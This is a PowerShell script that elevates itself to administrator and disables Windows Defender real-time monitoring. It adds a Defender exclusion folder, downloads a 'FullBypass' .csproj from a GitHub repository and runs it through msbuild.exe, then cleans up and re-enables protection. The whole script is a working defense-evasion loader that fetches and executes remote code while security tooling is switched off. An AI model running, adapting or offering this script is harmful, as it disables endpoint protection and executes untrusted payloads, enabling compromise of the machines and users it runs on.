###ADMIN CHECK###
# Check if the script is running as Administrator
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator)) {

    # Store current working directory
    $workingDir = (Get-Location).Path
    $scriptPath = $MyInvocation.MyCommand.Definition

    # Relaunch the script with elevation and pass the working directory as an argument
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" `"$workingDir`"" -Verb RunAs
    exit
}

# If elevated, restore the original working directory
if ($args.Count -gt 0) {
    Set-Location $args[0]
}

Set-MpPreference -DisableRealtimeMonitoring $true

Write-Host "Wait for defender to be disabled before proceeding"
pause
# --- User-defined variable ---
$excludePath = "$env:TEMP\daw"  # <-- Replace this with your desired path
$zipUrl = "https://raw.githubusercontent.com/Sh3lldon/FullBypass/refs/heads/main/csproj%20File/FullBypass.csproj"      # URL to download ZIP file
$zipPath = "$env:TEMP\daw\FullBypass.csproj"             # Temporary path to save ZIP
$extractPath = "$env:TEMP\ExtractedFolder"        # Directory to extract ZIP
$executableToRun = "$extractPath\YourApp.exe"     # File to run after extraction

New-Item -ItemType Directory -Force -Path $excludePath
# --- Add exclusion ---
Write-Host "Adding Windows Defender exclusion for: $excludePath"
Add-MpPreference -ExclusionPath $excludePath

# --- Download ZIP file ---
Write-Host "Downloading ZIP file..."
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath

# --- Extract ZIP file ---
#Write-Host "Extracting ZIP file..."
#Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force

# --- Run the executable ---
#Write-Host "Running extracted file..."
#Start-Process -FilePath $executableToRun
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe $zipPath


pause
# --- Optional: Cleanup ZIP ---
Remove-Item $zipPath

# --- Remove exclusion ---
Write-Host "Removing Windows Defender exclusion for: $excludePath"
Remove-MpPreference -ExclusionPath $excludePath


Set-MpPreference -DisableRealtimeMonitoring $false